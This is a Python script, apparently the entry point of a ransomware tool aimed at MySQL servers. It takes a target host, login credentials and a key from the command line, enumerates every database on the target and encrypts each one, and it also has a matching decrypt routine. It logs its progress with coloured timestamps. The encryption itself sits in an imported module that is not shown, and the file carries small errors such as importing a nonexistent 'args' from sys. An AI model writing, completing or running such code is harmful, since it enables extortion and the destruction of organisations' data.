from tools.mysqlDB import RansomwarMysql
from datetime import datetime
from colorama import Fore
from sys import args
class Main(RansomwarMysql):
    def __init__(self, attack_method:str ,*args, **kwargs) -> None:
        if attack_method == "mysql":
            RansomwarMysql.__init__(self , *args , **kwargs)
        else:
            self.print_log("to last update add new databases")
            exit(0)
              
    def print_log(self , text):
        today = datetime.today()
        new_text = f"{Fore.RED}[{Fore.YELLOW}{today.year}/{today.month}/{today.day}{Fore.RED}] {Fore.CYAN}- {Fore.RED}[{Fore.YELLOW}{today.hour}:{today.minute}:{today.second}{Fore.RED}] {Fore.GREEN} {text}"
        print(new_text)
            
    def run_encrypter(self):
        self.print_log(f"the password encrypter : {self.defult_key.decode()}")
        self.print_log(f"Get Databases From  Target : {self.host}")
        databases : list = self.get_all_databases()
        for database in databases:
            self.print_log(f"connect to database : {database}")
            self.print_log(f"running encrypter")
            result = self.encrypt_database(database_name=database)
            if result != False:
                self.print_log(f"encrypted database : {database}")
            else:
                self.print_log(f"this database was encrypted")
                
        self.print_log(f"encrypted all databases")


    def run_decrypter(self):
        self.print_log(f"Get Databases From  Target : {self.host}")
        databases : list = self.get_all_databases()
        for database in databases:
            self.print_log(f"connect to database : {database}")
            self.print_log(f"running decrypter")
            result = self.decrypt_database(database_name=database , key=self.defult_key)
            if result != False:            
                self.print_log(f"decrypted database : {database}")
        self.print_log(f"decrypted all databases")
        
if __name__ == "__main__":
     
    app = Main(attack_method='mysql' , host=args[2] , username=args[3] , password=args[4] , key=args[5])
    if args[1] == "encrypt": 
         app.run_encrypter()
    else: 
        app.run_decrypter() 
